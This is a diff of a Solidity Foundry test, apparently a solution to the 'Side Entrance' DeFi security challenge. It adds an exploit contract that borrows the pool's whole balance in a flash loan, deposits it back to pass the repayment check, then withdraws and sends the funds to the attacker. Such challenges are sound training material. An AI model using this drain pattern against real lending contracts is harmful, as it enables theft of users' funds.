@@ -32,11 +32,12 @@ contract SideEntrance is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitSideEntrance() public {
         /**
          * EXPLOIT START *
          */
-
+ SideEntranceExploit exploit = new SideEntranceExploit(address(sideEntranceLenderPool), attacker);
+exploit.attack();
         /**
          * EXPLOIT END *
          */
@@ -48,4 +49,34 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+
+interface ISideEntranceLenderPool {
+    function deposit() external payable;
+    function withdraw() external;
+    function flashLoan(uint256 amount) external;
+}
+
+contract SideEntranceExploit {
+    ISideEntranceLenderPool private immutable pool;
+    address private immutable attacker;
+
+    constructor(address _pool, address _attacker) {
+        pool = ISideEntranceLenderPool(_pool);
+        attacker = _attacker;
+    }
+
+    function attack() external {
+        uint256 poolBalance = address(pool).balance;
+        pool.flashLoan(poolBalance);
+        pool.withdraw();
+        payable(attacker).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
 }
